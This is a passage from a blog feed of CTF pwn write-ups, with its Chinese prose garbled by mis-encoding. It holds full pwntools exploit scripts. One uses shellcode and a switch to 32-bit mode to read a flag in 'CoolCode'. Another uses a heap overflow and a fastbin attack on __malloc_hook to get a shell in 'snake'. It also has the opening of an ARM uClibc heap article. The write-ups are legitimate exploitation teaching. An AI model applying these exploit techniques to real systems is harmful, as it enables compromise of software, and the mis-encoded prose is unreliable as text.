class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;O&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;O&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor al,0x41</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4b],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4c],al</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x4a],al</span></span><br><span class="line"><span class="string">xor al,0x41</span></span><br><span class="line"><span class="string">xor al,0x53</span></span><br><span class="line"><span class="string">xor byte ptr [rsi+0x48],al</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">sc += <span class="string">&#x27;M2WND&#x27;</span></span><br><span class="line">add(-<span class="number">34</span>,sc)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#read()</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push r11</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x4d</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">3</span>+sc)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># mmap 0xcafe000  mmap(0xcafe000,0x1000,7,34,0,0)</span></span><br><span class="line">sc = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edi,0xcafe000</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0x1000</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">xor dl,7</span></span><br><span class="line"><span class="string">push 0x22</span></span><br><span class="line"><span class="string">pop r10</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">dec r8</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">mov eax,9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># read(0,0xcafe000,0x100)</span></span><br><span class="line">sc += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsp,0xcafe200</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov esi,0xcafe000</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov edx,0x1000</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x58</span>+<span class="string">&#x27;\x90&#x27;</span>*<span class="number">2</span>+sc)</span><br><span class="line"><span class="comment"># open(flag) and &#x27;add esp,8&#x27; and &#x27;retf&#x27;</span></span><br><span class="line">sc = <span class="string">&#x27;h\x01\x01\x01\x01\x814$`f\x01\x01h./fl\x89\xe31\xc91\xd2j\x05X\xcd\x80&#x27;</span>+<span class="string">&#x27;\x83\xc4\x08&#x27;</span>+<span class="string">&#x27;\xcb&#x27;</span></span><br><span class="line">sc = sc.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line"><span class="comment">#read+write</span></span><br><span class="line">sc += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,rax</span></span><br><span class="line"><span class="string">mov rsi,0xcafe400</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">inc rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">sc = sc.ljust(<span class="number">0x200</span>,<span class="string">&quot;\x90&quot;</span>)</span><br><span class="line">sc += p64(<span class="number">0xcafe000</span>)+p64(<span class="number">0x23</span>)+p32(<span class="number">0xcafe080</span>)+p32(<span class="number">0x33</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(sc)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="è§£æ³•äºŒï¼š"><a href="#è§£æ³•äºŒï¼š" class="headerlink" title="è§£æ³•äºŒï¼š"></a>è§£æ³•äºŒï¼š</h4><p>è¿™æ¬¡æˆ‘ä»¬å…ˆè¦†ç›–exitçš„gotè¡¨ä¸ºretæ¥ç»•è¿‡check,è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨å †ä¸Šå†™shellcodeï¼Œç„¶åè¦†ç›–freeçš„gotè¡¨ï¼Œåˆ©ç”¨deleè§¦å‘shellcodeã€‚</p><p>shellcodeçš„ç¼–å†™è¿‡ç¨‹å°±æ˜¯å…ˆæ‰§è¡Œreadå°†ä¹‹åçš„shellcodeè¯»åˆ°bssæ®µï¼Œä¹‹åretfqåˆ‡æ¢32ä½æ±‡ç¼–å¹¶è·³åˆ°bssä¸Šç»§ç»­æ‰§è¡Œopen_x86çš„æ“ä½œï¼Œæœ€åread and writeè¯»å‡ºflagã€‚</p><p><strong>è¦æ³¨æ„çš„å‡ ç‚¹</strong>ï¼š</p><p>openå‡½æ•°çš„å‚æ•°ä¼ é€’ï¼š</p><p>eax &#x3D; 0x05 ç³»ç»Ÿè°ƒç”¨å·ã€ebx &#x3D; filename æ–‡ä»¶åã€ecx &#x3D; flags ç½®é›¶å³å¯ã€edx &#x3D; mode ç½®é›¶å³å¯ã€‚</p><p>ç„¶åå°±æ˜¯å†æ„é€ æ–‡ä»¶åâ€™flagâ€™çš„æ—¶å€™ç”±äºæ˜¯32çš„æ¨¡å¼ï¼Œè¦æ³¨æ„é”™ä½çš„é—®é¢˜ã€‚</p><p>è¿˜æœ‰å°±æ˜¯æ³¨æ„ç†è§£retfqæ‰§è¡Œçš„æ“ä½œä¸ºpop ripï¼Œpop csï¼ˆcs &#x3D; 0x23ä»£è¡¨32ä½æ¨¡å¼ï¼Œcs &#x3D; 0x33ä»£è¡¨64ä½æ¨¡å¼ï¼‰ï¼Œæ‰€ä»¥è¦æ³¨æ„æ ˆä¸­çš„å‚æ•°ä½ç½®ã€‚retfqè·³è½¬è¿‡å»çš„æ—¶å€™ç¨‹åºå·²ç»åˆ‡æ¢æˆäº†32ä½æ¨¡å¼ï¼Œè¦æ³¨æ„å¹³è¡¡å¥½espçš„åœ°å€</p><p>æœ€åè¿˜å¾—å›åˆ°64ä½æ¨¡å¼ä¸‹è°ƒç”¨ï¼Œå†è°ƒç”¨ä¸€æ¬¡retfqã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./CoolCode&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot; :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">push 0x60</span></span><br><span class="line"><span class="string">mov esi,0x1010101</span></span><br><span class="line"><span class="string">xor esi,0x1612601</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov esp,esi</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x60272b</span></span><br><span class="line"><span class="string">retfq</span></span><br><span class="line"><span class="string">mov rdi,0x3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x60</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">readflag=asm(read_flag,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">add(-<span class="number">22</span>,<span class="string">&#x27;\xc3&#x27;</span>)</span><br><span class="line">add(-<span class="number">37</span>,asm(read,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">payload=p64(<span class="number">0x602710</span>)+p64(<span class="number">0x23</span>)+asm(open_x86)+readflag</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02-snake"><a href="#0x02-snake" class="headerlink" title="0x02 snake"></a>0x02 snake</h3><p>ç¨‹åºæ˜¯æ˜¯ä¸€ä¸ªè´ªåƒè›‡ï¼Œå½“è›‡æ­»åçš„leave wordså­˜åœ¨å †æº¢å‡ºï¼Œæ­£å¥½å¯ä»¥ä¼ªé€ ä¸‹ä¸€ä¸ªå †çš„sizeã€‚</p><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>é¦–å…ˆæ—¢ç„¶å¯ä»¥ä¼ªé€ sizeå°±æƒ³åŠæ³•æ„é€ overlapï¼Œå…ˆå°†å­˜æ”¾nameçš„chunk0åˆ é™¤ï¼Œç”³è¯·æ–°çš„chunk0å¤§å°ä¸º0x68ï¼ˆä¸ºä¹‹åçš„fastbin attackï¼‰å‡†å¤‡ã€‚</p><p>ä¹‹ååˆ©ç”¨scanfè¾“å…¥å¾ˆé•¿çš„å­—ç¬¦ä¸²è§¦å‘malloc_consolidate()ä½œç”¨ä¸ºï¼š</p><p>1ã€æ£€æŸ¥fastbinæ˜¯å¦åˆå§‹åŒ–ï¼Œå¦‚æœæœªåˆå§‹åŒ–ï¼Œåˆ™è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>2ã€å¦‚æœfastbinåˆå§‹åŒ–ï¼Œåˆ™æŒ‰ç…§ä¸€å®šçš„é¡ºåºåˆå¹¶fastbinä¸­çš„chunkæ”¾å…¥unsorted binä¸­</p><p>è¿™æ ·ä¸€æ¥æ”¾å…¥unsorted binçš„å †å†…å°±å­˜åœ¨æ‰§è¡Œmain_arenaçš„æŒ‡é’ˆï¼Œç„¶åå°†å®ƒç”³è¯·å›æ¥åˆ©ç”¨get_name+restartæ³„éœ²libc</p><p>ä¹‹åå†leave wordsæ—¶å€™ä¿®æ”¹chunk1ï¼ˆä¹Ÿå°±æ˜¯æœ€å¼€å§‹çš„chunk0ï¼‰çš„sizeä¸º0x91ï¼Œé€ æˆchunk0å’Œchunk1çš„overlopã€‚</p><p>æœ€åfastbin attackæ”¹malloc_hookåˆ°one_gadgetæ‹¿shellã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./snake&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;4.start name&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;long?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;how long?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;asdasdasd&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;join&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;s&quot;</span>*<span class="number">0x23</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;words:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;exit?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">get(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;s&quot;</span>*<span class="number">0x23</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;player name: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3c4b37</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;words:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">0x4c</span>+<span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;exit?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(libc.address+<span class="number">0xf02a4</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†</title>
      <link href="/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h5 id="armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†"><a href="#armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†" class="headerlink" title="armæ„æ¶uclibcä¸‹çš„å †æº¢å‡ºåˆè¯†"></a>armæ„æ¶<code>uclibc</code>ä¸‹çš„å †æº¢å‡ºåˆè¯†</h5><p>ç¬¬äº”ç©ºé—´2020é‡åˆ°çš„ä¸€é“armæ„æ¶çš„é¢˜ç›®ã€‚</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">angela@angela-dev:/mnt/hgfs/share/pwn/5space/pwnme/lib$ file a.out</span><br><span class="line">a.out: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯32ä½ARMåŠ¨æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿è¡Œæ–¹å¼å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ./lib ./a.out // ./libä¸ºåŠ¨æ€é“¾æ¥åº“çš„è·¯å¾„</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»‹ç»<code>uclibc</code>ï¼Œæ˜¯ <code>glibc</code> çš„ä¸€ä¸ªç²¾ç®€ç‰ˆï¼Œä¸»è¦ç”¨äºåµŒå…¥å¼è®¾å¤‡ï¼Œæ¯”å¦‚è·¯ç”±å™¨å°±åŸºæœ¬ä½¿ç”¨çš„æ˜¯ <code>uClibc</code>ï¼Œ ç®€å•è‡ªç„¶æ•ˆç‡é«˜ã€‚æ‰€ä»¥ä»–å’Œä¸€èˆ¬çš„<code>x86</code>çš„å †åˆ†é…æœºåˆ¶ä¼šæœ‰äº›ä¸ä¸€æ ·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct heap_free_area</span><br><span class="line">&#123;</span><br><span class="line">size_t size;  //ç©ºé—²åŒºçš„å¤§å°</span><br><span class="line"> //ç”¨äºæ„é€ å¾ªç¯é“¾è¡¨</span><br><span class="line">struct heap_free_area *next, *prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">size è¡¨ç¤ºè¯¥ç©ºé—²åŒºåŸŸçš„å¤§å°ï¼Œè¿™ä¸ªç©ºé—²åŒºåŸŸçš„å®é™…åœ°å€å¹¶æ²¡æœ‰ç”¨æŒ‡é’ˆè¯¦ç»†åœ°æŒ‡æ˜ï¼Œ</span><br><span class="line">å› ä¸ºå®ƒå°±ä½äºå½“å‰ heap_free_area èŠ‚ç‚¹çš„å‰é¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</span><br><span class="line"></span><br><span class="line">+-------------------------------+--------------------+</span><br><span class="line">|                               |   heap_free_area   |</span><br><span class="line">+-------------------------------+--------------------+</span><br><span class="line">\___________ ç©ºé—²ç©ºé—´ ___________/\___ ç©ºé—²ç©ºé—´ä¿¡æ¯ ___/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å®é™…å¯ç”¨çš„ç©ºé—²ç©ºé—´å¤§å°ä¸º size â€“ sizeof(struct heap_free_area)</span><br><span class="line"></span><br><span class="line">æŒ‡é’ˆ next, prev åˆ†åˆ«æŒ‡å‘ä¸‹ä¸€ä¸ªå’Œä¸Šä¸€ä¸ªç©ºé—´åŒºåŸŸï¼Œ</span><br><span class="line">æ‰€æœ‰çš„ç©ºé—²åŒºåŸŸå°±æ˜¯é€šè¿‡è®¸è®¸å¤šå¤šè¿™æ ·çš„èŠ‚ç‚¹é“¾èµ·æ¥çš„ï¼Œ</span><br><span class="line">å¾ˆæ˜¾ç„¶ï¼Œè¿™æ ·ç»„æˆçš„æ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ <code>free</code> å—åœ¨å†…å­˜ä¸­çš„å­˜å‚¨æ–¹å¼å’Œ <code>glibc</code> ä¸­çš„å­˜å‚¨æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚å®ƒçš„å…ƒæ•°æ®åœ¨å—çš„æœ«å°¾ï¼Œè€Œ 